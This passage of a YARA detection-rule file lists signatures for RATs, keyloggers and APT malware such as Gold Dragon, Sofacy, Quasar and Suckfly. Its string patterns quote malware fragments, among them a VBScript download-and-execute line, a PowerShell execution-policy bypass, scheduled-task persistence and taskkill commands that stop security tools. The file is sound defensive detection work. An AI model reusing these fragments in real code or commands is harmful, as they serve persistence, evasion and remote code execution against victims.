 strings:\n      $x1 = \"A( Array( (1* 2^1 )+\" ascii\n      $x2 = \".addcode(A( Array(\" ascii\n      $x3 = \"false:AA.send:Execute(AA.responsetext):end\" ascii\n      $x4 = \"& A( Array(  (1* 2^1 )+\" ascii\n      $s1 = \".SYSTEMTYPE:NEXT:IF (UCASE(\" ascii\n      $s2 = \"A = STR:next:end function\" ascii\n      $s3 = \"&WSCRIPT.SCRIPTFULLNAME&CHR\" fullword ascii\n   condition: \n      filesize < 600KB and ( 1 of ( $x* ) or 3 of them )\n}\n\nrule CN_disclosed_20180208_lsls_RID2FCC : CHINA DEMO FILE MAL {\n   meta:\n      description = \"Detects malware from disclosed CN malware set\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyberintproject/status/961714165550342146\"\n      date = \"2018-02-08 12:12:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"94c6a92984df9ed255f4c644261b01c4e255acbe32ddfd0debe38b558f29a6c9\"\n      tags = \"CHINA, DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 3000KB and $x1\n}\n\nrule CN_disclosed_20180208_c_RID2E71 : CHINA DEMO EXE FILE MAL T1047 T1053_005 {\n   meta:\n      description = \"Detects malware from disclosed CN malware set\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyberintproject/status/961714165550342146\"\n      date = \"2018-02-08 11:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"17475d25d40c877284e73890a9dd55fccedc6a5a071c351a8c342c8ef7f9cea7\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL, T1047, T1053_005\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd.exe /c ping 0 -n 2 & del \\\"\" fullword wide\n      $x2 = \"schtasks /create /sc minute /mo 1 /tn Server /tr \" fullword wide\n      $x3 = \"www.upload.ee/image/\" wide\n      $s1 = \"winmgmts:\\\\\\\\.\\\\root\\\\SecurityCenter2\" fullword wide\n      $s2 = \"/Server.exe\" fullword wide\n      $s3 = \"Executed As \" fullword wide\n      $s4 = \"WmiPrvSE.exe\" fullword wide\n      $s5 = \"Stub.exe\" fullword ascii\n      $s6 = \"Download ERROR\" fullword wide\n      $s7 = \"shutdown -r -t 00\" fullword wide\n      $s8 = \"Select * From AntiVirusProduct\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 4 of them )\n}\n\nrule CN_disclosed_20180208_System3_RID30C6 : CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from disclosed CN malware set\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/cyberintproject/status/961714165550342146\"\n      date = \"2018-02-08 12:54:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"73fa84cff51d384c2d22d9e53fc5d42cb642172447b07e796c81dd403fb010c2\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"WmiPrvSE.exe\" fullword wide\n      $s1 = \"C:\\\\Users\\\\sgl\\\\AppData\\\\Local\\\\\" ascii\n      $s2 = \"Temporary Projects\\\\WmiPrvSE\\\\\" ascii\n      $s3 = \"$15a32a5d-4906-458a-8f57-402311afc1c1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and $a1 and 1 of ( $s* )\n}\n\nrule CN_disclosed_20180208_Mal1_RID2F59 : CHINA DEMO EXE FILE HIGHVOL MAL {\n   meta:\n      description = \"Detects malware from disclosed CN malware set\"\n      author = \"Florian Roth\"\n      reference = \"https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details\"\n      date = \"2018-02-08 11:53:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"173d69164a6df5bced94ab7016435c128ccf7156145f5d26ca59652ef5dcd24e\"\n      tags = \"CHINA, DEMO, EXE, FILE, HIGHVOL, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"%SystemRoot%\\\\system32\\\\termsrvhack.dll\" fullword ascii\n      $x2 = \"User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" fullword ascii\n      $a1 = \"taskkill /f /im cmd.exe\" fullword ascii\n      $a2 = \"taskkill /f /im mstsc.exe\" fullword ascii\n      $a3 = \"taskkill /f /im taskmgr.exe\" fullword ascii\n      $a4 = \"taskkill /f /im regedit.exe\" fullword ascii\n      $a5 = \"taskkill /f /im mmc.exe\" fullword ascii\n      $s1 = \"K7TSecurity.exe\" fullword ascii\n      $s2 = \"ServUDaemon.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( pe.imphash ( ) == \"28e3a58132364197d7cb29ee104004bf\" or 1 of ( $x* ) or 3 of them )\n}\n\nrule CN_disclosed_20180208_KeyLogger_1_RID3227 : CHINA DEMO EXE FILE MAL T1056_001 {\n   meta:\n      description = \"Detects malware from disclosed CN malware set\"\n      author = \"Florian Roth\"\n      reference = \"https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details\"\n      date = \"2018-02-08 13:53:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c492889e1d271a98e15264acbb21bfca9795466882520d55dc714c4899ed2fcf\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL, T1056_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"Process already elevated.\" fullword wide\n      $x3 = \"GetKeyloggErLogsResponse\" fullword ascii\n      $x4 = \"get_encryptedPassword\" fullword ascii\n      $x5 = \"DoDownloadAndExecute\" fullword ascii\n      $x6 = \"GetKeyloggeRLogs\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them\n}\n\nrule CN_disclosed_20180208_Mal4_RID2F5C : CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from disclosed CN malware set\"\n      author = \"Florian Roth\"\n      reference = \"https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details\"\n      date = \"2018-02-08 11:53:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f7549c74f09be7e4dbfb64006e535b9f6d17352e236edc2cdb102ec3035cf66e\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.0.0\"\n      \n   strings:\n      $s1 = \"Microsoft .Net Framework COM+ Support\" fullword ascii\n      $s2 = \"Microsoft .NET and Windows XP COM+ Integration with SOAP\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them and pe.exports ( \"SPACE\" )\n}\n\nrule CN_disclosed_20180208_Mal5_RID2F5D : CHINA DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects malware from disclosed CN malware set\"\n      author = \"Florian Roth\"\n      reference = \"https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details\"\n      date = \"2018-02-08 11:54:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"24c05cd8a1175fbd9aca315ec67fb621448d96bd186e8d5e98cb4f3a19482af4\"\n      hash2 = \"05696db46144dab3355dcefe0408f906a6d43fced04cb68334df31c6dfd12720\"\n      tags = \"CHINA, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"4System.Web.Services.Protocols.SoapHttpClientProtocol\" fullword ascii\n      $s2 = \"Server.exe\" fullword ascii\n      $s3 = \"System.Windows.Forms.Form\" fullword ascii\n      $s4 = \"Stub.Resources.resources\" fullword ascii\n      $s5 = \"My.Computer\" fullword ascii\n      $s6 = \"MyTemplate\" fullword ascii\n      $s7 = \"Stub.My.Resources\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule Sofacy_Campaign_Mal_Feb18_cdnver_RID3324 : APT DEMO EXE FILE G0007 MAL RUSSIA {\n   meta:\n      description = \"Detects Sofacy malware\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ClearskySec/status/960924755355369472\"\n      date = \"2018-02-07 14:35:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"12e6642cf6413bdf5388bee663080fa299591b2ba023d069286f3be9647547c8\"\n      tags = \"APT, DEMO, EXE, FILE, G0007, MAL, RUSSIA\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"cdnver.dll\" fullword wide\n      $x2 = { 25 73 0A 00 00 00 00 00 30 00 00 00 20 00 2D 00\n              20 00 00 00 0A 00 00 00 25 00 73 00 00 00 00 00\n              69 00 6D 00 61 00 67 00 65 00 2F 00 6A 00 70 00\n              65 00 67 } \n      $s1 = \"S7%s - %lu\" fullword ascii\n      $s2 = \"SNFIRNW\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 90KB and ( pe.imphash ( ) == \"01f3d0fe6fb9d9df24620e67afc143c7\" or 1 of ( $x* ) or 2 of them )\n}\n\nrule ME_Campaign_Malware_1_RID2EDA : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects malware from Middle Eastern campaign reported by Talos\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n      date = \"2018-02-07 11:32:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1176642841762b3bc1f401a5987dc55ae4b007367e98740188468642ffbd474e\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and ( pe.imphash ( ) == \"618f76eaf4bd95c690d43e84d617efe9\" )\n}\n\nrule ME_Campaign_Malware_2_RID2EDB : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects malware from Middle Eastern campaign reported by Talos\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n      date = \"2018-02-07 11:32:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"76a9b603f1f901020f65358f1cbf94c1a427d9019f004a99aa8bff1dea01a881\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"QuickAssist.exe\" fullword wide\n      $s2 = \"<description>Microsoft Modern Sharing Solution</description>\" fullword ascii\n      $s3 = \"GBEWCWA\" fullword ascii\n      $s4 = \"name=\\\"QuickAssist\\\" \" fullword ascii\n      $s5 = \"Cimzal\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == \"b06055e6cc2a804111ab6964df1ca4ae\" or 4 of them )\n}\n\nrule ME_Campaign_Malware_3_RID2EDC : APT DEMO FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects malware from Middle Eastern campaign reported by Talos\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n      date = \"2018-02-07 11:32:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"15f5aaa71bfa3d62fd558a3e88dd5ba26f7638bf2ac653b8d6b8d54dc7e5926b\"\n      tags = \"APT, DEMO, FILE, MIDDLE_EAST\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"objWShell.Run \\\"powershell.exe -ExecutionPolicy Bypass -File \\\"\\\"%appdata%\\\"\\\"\\\\sys.ps1\\\", 0 \" fullword ascii\n      $x2 = \"objFile.WriteLine \\\"New-Item -Path \\\"\\\"$ENV:APPDATA\\\\Microsoft\\\\Templates\\\"\\\" -ItemType Directory -Force }\\\" \" fullword ascii\n      $x3 = \"objFile.WriteLine \\\"$path = \\\"\\\"$ENV:APPDATA\\\\Microsoft\\\\Templates\\\\Report.doc\\\"\\\"\\\" \" fullword ascii\n      $s4 = \"File=appData & \\\"\\\\sys.ps1\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x6553 and filesize < 400KB and 1 of them\n}\n\nrule ME_Campaign_Malware_4_RID2EDD : APT DEMO EXE FILE MIDDLE_EAST {\n   meta:\n      description = \"Detects malware from Middle Eastern campaign reported by Talos\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n      date = \"2018-02-07 11:32:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c5bfb5118a999d21e9f445ad6ccb08eb71bc7bd4de9e88a41be9cf732156c525\"\n      tags = \"APT, DEMO, EXE, FILE, MIDDLE_EAST\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and pe.imphash ( ) == \"fb7da233a35ac523d6059fff543627ab\"\n}\n\nrule ME_Campaign_Malware_5_RID2EDE : APT DEMO EXE MIDDLE_EAST T1047 {\n   meta:\n      description = \"Detects malware from Middle Eastern campaign reported by Talos\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.talosintelligence.com/2018/02/targeted-attacks-in-middle-east.html\"\n      date = \"2018-02-07 11:32:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-08-18\"\n      hash1 = \"d49e9fdfdce1e93615c406ae13ac5f6f68fb7e321ed4f275f328ac8146dd0fc1\"\n      hash2 = \"e66af059f37bdd35056d1bb6a1ba3695fc5ce333dc96b5a7d7cc9167e32571c5\"\n      tags = \"APT, DEMO, EXE, MIDDLE_EAST, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"D:\\\\me\\\\do\\\\do\\\\obj\\\\\" ascii\n      $s2 = \"Select * from Win32_ComputerSystem\" fullword wide\n      $s3 = \"Get_Antivirus\" fullword ascii\n      $s4 = \"{{\\\"id\\\":\\\"{0}\\\",\\\"user\\\":\\\"{1}\\\",\\\"path\\\":\\\"{2}\\\"}}\" fullword wide\n      $s5 = \"update software online\" fullword wide\n      $s6 = \"time.nist.gov\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 5 of them or all of them\n}\n\nrule GoldDragon_malware_Feb18_1_RID309F : APT CHINA CRIME DEMO EXE FILE {\n   meta:\n      description = \"Detects malware from Gold Dragon report\"\n      author = \"Florian Roth\"\n      reference = \"https://securingtomorrow.mcafee.com/mcafee-labs/gold-dragon-widens-olympics-malware-attacks-gains-permanent-presence-on-victims-systems/\"\n      date = \"2018-02-03 12:47:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, CRIME, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"168c2f7752511dfd263a83d5d08a90db\" or pe.imphash ( ) == \"0606858bdeb129de33a2b095d7806e74\" or pe.imphash ( ) == \"51d992f5b9e01533eb1356323ed1cb0f\" or pe.imphash ( ) == \"bb801224abd8562f9ee8fb261b75e32a\" )\n}\n\nrule GoldDragon_Aux_File_RID2E5E : APT CHINA CRIME DEMO {\n   meta:\n      description = \"Detects export from Gold Dragon - February 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://securingtomorrow.mcafee.com/mcafee-labs/gold-dragon-widens-olympics-malware-attacks-gains-permanent-presence-on-victims-systems/\"\n      date = \"2018-02-03 11:11:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, CRIME, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/////////////////////regkeyenum////////////\" ascii\n   condition: \n      filesize < 500KB and 1 of them\n}\n\nrule GoldDragon_Ghost419_RAT_RID2F3A : APT CHINA CRIME DEMO EXE FILE T1082 T1083 {\n   meta:\n      description = \"Detects Ghost419 RAT from Gold Dragon report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.mcafee.com:443/blogs/\"\n      date = \"2018-02-03 11:48:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"45bfa1327c2c0118c152c7192ada429c6d4ae03b8164ebe36ab5ba9a84f5d7aa\"\n      hash2 = \"ee7a9a7589cbbcac8b6bf1a3d9c5d1c1ada98e68ac2f43ff93f768661b7e4a85\"\n      hash3 = \"dee482e5f461a8e531a6a7ea4728535aafdc4941a8939bc3c55f6cb28c46ad3d\"\n      tags = \"APT, CHINA, CRIME, DEMO, EXE, FILE, T1082, T1083\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.6.0\"\n      \n   strings:\n      $x2 = \"WebKitFormBoundarywhpFxMBe19cSjFnG\" ascii\n      $x3 = \"\\\\Microsoft\\\\HNC\\\\\" ascii\n      $x4 = \"\\\\anternet abplorer\" ascii\n      $x5 = \"%s\\\\abxplore.exe\" fullword ascii\n      $x6 = \"GHOST419\" fullword ascii\n      $x7 = \"I,m Online. %04d - %02d - %02d - %02d - %02d\" fullword ascii\n      $x8 = \"//////////////////////////regkeyenum//////////////\" ascii\n      $s0 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322)\" fullword ascii\n      $s1 = \"www.GoldDragon.com\" fullword ascii\n      $s2 = \"/c systeminfo >> %s\" fullword ascii\n      $s3 = \"/c dir %s\\\\ >> %s\" fullword ascii\n      $s4 = \"DownLoading %02x, %02x, %02x\" fullword ascii\n      $s5 = \"Tran_dll.dll\" fullword ascii\n      $s6 = \"MpCmdRunkr.dll\" fullword ascii\n      $s7 = \"MpCmdRun.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( ( pe.exports ( \"ExportFunction\" ) and pe.number_of_exports == 1 ) or ( 1 of ( $x* ) and 1 of ( $s* ) ) or 3 of them )\n}\n\nrule GoldDragon_RunningRAT_RID2F19 : APT CHINA CRIME DEMO EXE FILE T1218_011 {\n   meta:\n      description = \"Detects Running RAT from Gold Dragon report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.mcafee.com:443/blogs/\"\n      date = \"2018-02-03 11:42:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"0852f2c5741997d8899a34bb95c349d7a9fb7277cd0910656c3ce37a6f11cb88\"\n      hash2 = \"2981e1a1b3c395cee6e4b9e6c46d062cf6130546b04401d724750e4c8382c863\"\n      hash3 = \"7aa99ebc49a130f07304ed25655862a04cc20cb59d129e1416a7dfa04f7d3e51\"\n      tags = \"APT, CHINA, CRIME, DEMO, EXE, FILE, T1218_011\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"C:\\\\USERS\\\\WIN7_x64\\\\result.log\" fullword wide\n      $x2 = \"rundll32.exe %s RunningRat\" fullword ascii\n      $x3 = \"SystemRat.dll\" fullword ascii\n      $x4 = \"rundll32.exe %s ExportFunction\" fullword ascii\n      $x5 = \"rundll32.exe \\\"%s\\\" RunningRat\" fullword ascii\n      $x6 = \"ixeorat.bin\" fullword ascii\n      $x7 = \"C:\\\\USERS\\\\Public\\\\result.log\" fullword ascii\n      $a1 = \"emanybtsohteg\" fullword ascii\n      $a2 = \"tekcosesolc\" fullword ascii\n      $a3 = \"emankcosteg\" fullword ascii\n      $a4 = \"emantsohteg\" fullword ascii\n      $a5 = \"tpokcostes\" fullword ascii\n      $a6 = \"putratSASW\" fullword ascii\n      $s1 = \"ParentDll.dll\" fullword ascii\n      $s2 = \"MR - Already Existed\" fullword ascii\n      $s3 = \"MR First Started, Registed OK!\" fullword ascii\n      $s4 = \"RM-M : LoadResource OK!\" fullword ascii\n      $s5 = \"D:\\\\result.log\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"c78ccc8f02286648c4373d3bf03efc43\" or pe.exports ( \"RunningRat\" ) or 1 of ( $x* ) or 5 of ( $a* ) or 3 of ( $s* ) )\n}\n\nrule GoldDragon_RunnignRAT_RID2F19 : APT CHINA CRIME DEMO EXE FILE T1057 T1082 T1218_011 {\n   meta:\n      description = \"Detects Running RAT malware from Gold Dragon report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.mcafee.com:443/blogs/\"\n      date = \"2018-02-03 11:42:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"94aa827a514d7aa70c404ec326edaaad4b2b738ffaea5a66c0c9f246738df579\"\n      hash2 = \"5cbc07895d099ce39a3142025c557b7fac41d79914535ab7ffc2094809f12a4b\"\n      hash3 = \"98ccf3a463b81a47fdf4275e228a8f2266e613e08baae8bdcd098e49851ed49a\"\n      tags = \"APT, CHINA, CRIME, DEMO, EXE, FILE, T1057, T1082, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd.exe /c systeminfo \" fullword ascii\n      $s2 = \"ieproxy.dll\" fullword ascii\n      $s3 = \"taskkill /f /im daumcleaner.exe\" fullword ascii\n      $s4 = \"cmd.exe /c tasklist \" fullword ascii\n      $s5 = \"rundll32.exe \\\"%s\\\" Run\" fullword ascii\n      $s6 = \"Mozilla/5.0 (Windows NT 5.2; rv:12.0) Gecko/20100101 Firefox/12.0\" fullword ascii\n      $s7 = \"%s\\\\%s_%03d\" fullword wide\n      $s8 = \"\\\\PI_001.dat\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 3 of them )\n}\n\nrule Scarcruft_malware_Feb18_1_RID306B : APT DEMO EXE FILE G0067 NK {\n   meta:\n      description = \"Detects Scarcruft malware - February 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/craiu/status/959477129795731458\"\n      date = \"2018-02-03 12:39:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, G0067, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"d:\\\\HighSchool\\\\version 13\\\\2ndBD\\\\T+M\\\\\" ascii\n      $x2 = \"cmd.exe /C ping 0.1.1.2\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them\n}\n\nrule TopHat_Malware_Jan18_2_RID2EFB : APT DEMO EXE FILE T1543_003 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file e.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services/#appendix\"\n      date = \"2018-01-29 11:37:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"9580d15a06cd59c01c59bca81fa0ca8229f410b264a38538453f7d97bfb315e7\"\n      tags = \"APT, DEMO, EXE, FILE, T1543_003\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\FontSubstitutes\" fullword ascii\n      $s2 = \"\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Keyboard Layouts\\\\\" ascii\n      $s3 = \"LError loading dock zone from the stream. Expecting version %d, but found %d.\" fullword wide\n      $s4 = \"WINMGMTS:\\\\\\\\.\\\\ROOT\\\\CIMV2\" fullword ascii\n      $s5 = \"UENCRYPTION\" fullword ascii\n      $s6 = \"TEXPORTAPIS\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.imphash ( ) == \"f98cebcae832abc3c46e6e296aecfc03\" and 5 of them )\n}\n\nrule TopHat_BAT_RID2A97 : APT DEMO SCRIPT {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file cgen.bat\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-the-tophat-campaign-attacks-within-the-middle-east-region-using-popular-third-party-services/#appendix\"\n      date = \"2018-01-29 07:03:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f998271c4140caad13f0674a192093092e2a9f7794a7fbbdaa73ae8f2496c387\"\n      hash2 = \"0fbc6fd653b971c8677aa17ecd2749200a4a563f9dd5409cfb26d320618db3e2\"\n      tags = \"APT, DEMO, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"= New-Object IO.MemoryStream(,[Convert]::FromBase64String(\\\"\" ascii\n      $s2 = \"goto Start\" fullword ascii\n      $s3 = \":Start\" fullword ascii\n   condition: \n      filesize < 5KB and all of them\n}\n\nrule Quasar_RAT_Jan18_1_RID2D35 : APT DEMO EXE FILE T1047 {\n   meta:\n      description = \"Detects Quasar RAT\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/01/unit42-vermin-quasar-rat-custom-malware-used-ukraine/\"\n      date = \"2018-01-29 10:22:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0157b43eb3c20928b77f8700ad8eb279a0aa348921df074cd22ebaff01edaae6\"\n      hash2 = \"24956d8edcf2a1fd26805ec58cfd1ee7498e1a59af8cc2f4b832a7ab34948c18\"\n      tags = \"APT, DEMO, EXE, FILE, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"ping -n 20 localhost > nul\" fullword wide\n      $s2 = \"HandleDownloadAndExecuteCommand\" fullword ascii\n      $s3 = \"DownloadAndExecute\" fullword ascii\n      $s4 = \"UploadAndExecute\" fullword ascii\n      $s5 = \"ShellCommandResponse\" fullword ascii\n      $s6 = \"Select * From Win32_ComputerSystem\" fullword wide\n      $s7 = \"Process could not be started!\" fullword wide\n      $s8 = \".Core.RemoteShell\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and $a1 and 3 of them\n}\n\nrule Suckfly_Nidiran_Gen_1_RID2F1F : DEMO EXE FILE G0039 GEN MAL {\n   meta:\n      description = \"Detects Suckfly Nidiran Trojan\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates\"\n      date = \"2018-01-28 11:43:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ac7d7c676f58ebfa5def9b84553f00f283c61e4a310459178ea9e7164004e734\"\n      tags = \"DEMO, EXE, FILE, G0039, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WriteProcessMemory fail at %d \" fullword ascii\n      $s2 = \"CreateRemoteThread fail at %d \" fullword ascii\n      $s3 = \"CreateRemoteThread Succ\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule Suckfly_Nidiran_Gen_2_RID2F20 : DEMO EXE FILE G0039 GEN MAL {\n   meta:\n      description = \"Detects Suckfly Nidiran Trojan\"\n      author = \"Florian Roth\"\n      reference = \"https://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates\"\n      date = \"2018-01-28 11:43:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b53a316a03b46758cb128e5045dab2717cb36e7b5eb1863ce2524d4f69bc2cab\"\n      hash2 = \"eaee2bf83cf90d35dab8a4711f7a5f2ebf9741007668f3746995f4564046fbdf\"\n      tags = \"DEMO, EXE, FILE, G0039, GEN, MAL\"\n      minimum_yara = 